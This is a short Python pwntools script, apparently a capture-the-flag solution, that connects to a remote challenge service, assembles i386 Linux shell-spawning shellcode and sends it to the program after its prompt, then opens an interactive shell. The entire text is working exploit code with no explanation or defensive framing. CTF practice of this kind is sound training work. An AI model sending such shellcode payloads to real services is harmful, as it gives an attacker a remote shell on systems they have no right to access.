from pwn import *

context.arch = 'i386'

#p = process('./runit')
p = remote('node4.buuoj.cn', 29560)

payload = asm(shellcraft.sh(), os = 'linux')

p.sendlineafter(b'stuff!!\n', payload)

p.interactive()